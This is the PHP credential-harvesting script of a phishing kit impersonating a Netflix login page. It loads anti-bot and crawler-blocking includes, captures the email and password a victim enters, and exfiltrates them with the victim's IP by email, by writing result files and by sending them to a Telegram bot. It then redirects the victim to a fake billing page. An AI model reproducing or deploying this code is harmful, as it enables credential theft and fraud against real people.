<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include 'autob/bts2.php';
include "req/config.php";
$email = $_POST['email'];$password = $_POST['password'];

if(isset($_POST['email']) && isset($_POST['password'])){
    if(preg_match("/[a-z0-9._%+-]+@[a-z0-9.-_]+\.[a-z]{2,}$/",strtolower($email)) || preg_match("/[0-9\s\-\(\)]{8,}/",strtolower($email))){		
		$_SESSION['action']='login';
	///////////////////////// MAIL PART //////////////////////
        $email        = $_POST['email'];
        $password     = $_POST['password'];
        $PublicIP     = $_SERVER['REMOTE_ADDR'];
        $Info_LOG = "
|--===-====-===-- $resultheading --===-====-===--|
-------------- ♥♥ NEW Netflix LOGIN ♥♥ -----------
Email            : $email
Password         : $password ";
		$_SESSION['fullz']=$Info_LOG; 
$Info_LOG.='

'.$_SESSION['device'];

// Don't Touche
//Email
        if ($Send_Email == 1) {
            $subject = '♥♥ Netf1ix L0G ♥♥ '.$PublicIP ;$headers = 'From: YoCHI <yochnetf@yochnet.com>' . "\r\n" .'X-Mailer: PHP/' . phpversion();
				mail($to, $subject, $Info_LOG, $headers);
        };
//FTP == 1 save result >< == 0 don't save result
        if ($Ftp_Write == 1) {
			@mkdir("../rst");
            $file = fopen("../rst/Result_".$PublicIP.".txt", 'a');
            fwrite($file, $Info_LOG);
			fclose($file);
        };
//TELEGRAM 
        if ($send_tg == 1) {
			sendtoTG($tgid, $Info_LOG, $tgtoken);
        };
		if($usecaution==1){header("location:error?y=".md5(rand(100, 999999999))."");} else{header("location:bill/basic?websrc=".md5('yochidemonArt'.rand(1000000000,500000000)));};
    }
    else{header("location:".$index."?".$theerrkey."=c".md5(rand(100, 999999999)));};
}
else{header("location:".$index."?".$theerrkey."=sdk".md5(rand(100, 999999999)));};


?>